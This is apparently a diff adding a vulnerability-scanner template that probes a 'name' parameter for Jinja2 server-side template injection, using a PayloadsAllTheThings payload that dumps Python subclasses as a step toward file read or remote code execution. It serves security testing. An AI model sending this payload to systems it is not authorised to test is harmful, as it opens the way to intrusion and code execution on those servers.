@@ -1,0 +1,24 @@
+id: patt-ssti-jinja2-err-01-name
+name: 'PATT ssti patt-ssti-jinja2-err-01 via name'
+severity: critical
+type: active
+tags:
+  - ssti
+  - patt
+requires:
+  - python
+  - django
+description: 'PATT Jinja2 Error-Based: dump subclasses (jalan menuju file-read/RCE). [patt:patt-ssti-jinja2-err-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Python.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '{{ ''''.__class__.__mro__[2].__subclasses__() }}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'object'
+          - 'subclass'
+          - '49'
